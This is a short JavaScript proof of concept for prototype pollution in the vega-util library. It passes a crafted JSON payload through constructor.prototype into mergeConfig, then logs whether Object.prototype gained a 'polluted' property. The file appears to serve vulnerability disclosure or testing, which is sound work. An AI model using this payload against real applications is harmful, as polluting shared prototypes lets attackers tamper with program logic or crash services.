var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const util = require('vega-util');
const config = '{style: {point: {shape: triangle-right}}}';
const malicious_payload = '{"constructor": {"prototype": {"polluted":"yes"}}}';
console.log({}.polluted);
util.mergeConfig(config, JSON.parse(malicious_payload));
console.log({}.polluted);